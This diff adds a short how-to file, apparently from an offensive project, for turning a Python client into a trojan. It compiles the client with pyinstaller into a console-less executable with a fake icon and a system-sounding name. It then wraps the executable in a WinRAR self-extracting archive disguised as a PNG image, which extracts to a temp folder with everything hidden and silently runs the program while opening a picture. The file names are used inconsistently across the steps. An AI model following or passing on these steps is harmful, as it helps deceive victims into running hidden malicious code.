@@ -1,0 +1,24 @@
+# We will use pyinstaller module
+
+1. pip install pyinstaller
+
+# Create executable with no console
+# Add image icon to the exe to make it look more legit and then convert it to an icon (ICO) file.
+# We can use www.iconconvert.com
+
+2. pyinstaller --onefile --noconsole --icon=IconImage.ico --name="system64.exe" main_client.py 
+
+# Check in the dist folder for the main_client.exe file.
+
+# To make it a trojan we can use winrar
+# Within winrar select the program.exe, icon file and image file and then click on Add and give it an Archive name such as beautiful_image.png
+# Set compression method to Best
+# Select SFX Archive
+# Click on Advanced and then go to Advanced SFX options
+# Update tab - Select Extract and update files and Overwrite all files
+# Go tot Text and Icon tab
+# Select the icon file to use
+# To to modes tab and check Unpack to temporary folder and also select Hide All in Client mode
+# Setup tab add Run after extraction - wallpaper.png and add myapp.exe 
+# this will open the image file and the myapp.exe file.
+
